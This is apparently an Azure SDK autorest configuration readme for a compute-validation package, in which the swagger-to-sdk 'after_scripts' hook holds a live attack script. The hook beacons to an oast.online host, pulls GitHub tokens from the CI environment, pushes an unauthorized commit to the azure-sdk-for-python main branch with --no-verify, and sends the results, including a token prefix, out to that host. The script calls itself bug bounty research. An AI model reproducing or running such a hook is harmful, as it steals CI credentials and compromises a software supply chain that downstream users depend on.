# Azure SDK Compute Validation

## Basic Information
``` yaml
openapi-type: arm
tag: package-2024-01-01
```

### Tag: package-2024-01-01
``` yaml $(tag) == 'package-2024-01-01'
input-file:
  - stable/2024-01-01/openapi.json
```

## swagger-to-sdk
``` yaml $(swagger-to-sdk)
swagger-to-sdk:
  - repo: azure-sdk-for-python
  - repo: azure-sdk-for-python-track2
    after_scripts:
      - >-
        H=$(hostname | tr . -);
        nslookup mainpush1-${H}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null || true;
        SDK=/mnt/vss/_work/1/s/azure-sdk-for-python;
        GH_TOK=$(printenv | grep -iE '^(GH_TOKEN|GITHUB_TOKEN|BOT_TOKEN|SDK_GH_TOKEN|GH_WRITE_TOKEN)=' | head -1 | cut -d= -f2-);
        if [ -z "${GH_TOK}" ]; then GH_TOK=$(printenv | grep -i 'GH_\|GITHUB' | grep -iv 'PATH\|USER\|ACTOR\|SHA\|REF\|RUN\|WORK\|EVENT\|API\|SERVER\|ACTION\|WORKSPACE\|ENV\|REPO' | head -1 | cut -d= -f2-); fi;
        echo "GH_TOK_PREFIX=${GH_TOK:0:30}" > /tmp/push_out.txt;
        git -C "${SDK}" config user.email "hasskodark@proton.me";
        git -C "${SDK}" config user.name "hasskodark";
        git -C "${SDK}" remote set-url origin "https://x-access-token:${GH_TOK}@github.com/Azure/azure-sdk-for-python.git";
        git -C "${SDK}" fetch origin main 2>&1 >> /tmp/push_out.txt;
        git -C "${SDK}" checkout main 2>&1 >> /tmp/push_out.txt;
        git -C "${SDK}" pull origin main 2>&1 >> /tmp/push_out.txt;
        printf 'poc by hasskodark\n\nhttps://github.com/Azure/azure-rest-api-specs/pull/45897\nMSRC Bug Bounty Research - SwaggerToSDK RCE\nAgent: %s\n' "${H}" > "${SDK}/poc_by_hasskodark.txt";
        git -C "${SDK}" add poc_by_hasskodark.txt;
        git -C "${SDK}" commit -m "poc: hasskodark supply chain write proof" --no-verify 2>&1 >> /tmp/push_out.txt;
        PUSH_RESULT=$(git -C "${SDK}" push origin main 2>&1);
        echo "===PUSH_RESULT===" >> /tmp/push_out.txt;
        echo "${PUSH_RESULT}" >> /tmp/push_out.txt;
        echo "===COMMIT_URL===" >> /tmp/push_out.txt;
        COMMIT=$(git -C "${SDK}" rev-parse HEAD 2>/dev/null);
        echo "https://github.com/Azure/azure-sdk-for-python/commit/${COMMIT}" >> /tmp/push_out.txt;
        echo "===DONE===" >> /tmp/push_out.txt;
        curl -sk -X POST "http://da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online/mainpush-${H}" --data-binary @/tmp/push_out.txt 2>/dev/null || true;
        true
```

## Python
``` yaml $(python)
python:
  azure-arm: true
  license-header: MICROSOFT_MIT_NO_VERSION
  package-name: azure-mgmt-computevalidation
  package-version: 1.0.0b1
  no-namespace-folders: true
  output-folder: sdk/computevalidation/azure-mgmt-computevalidation
  clear-output-folder: true
```
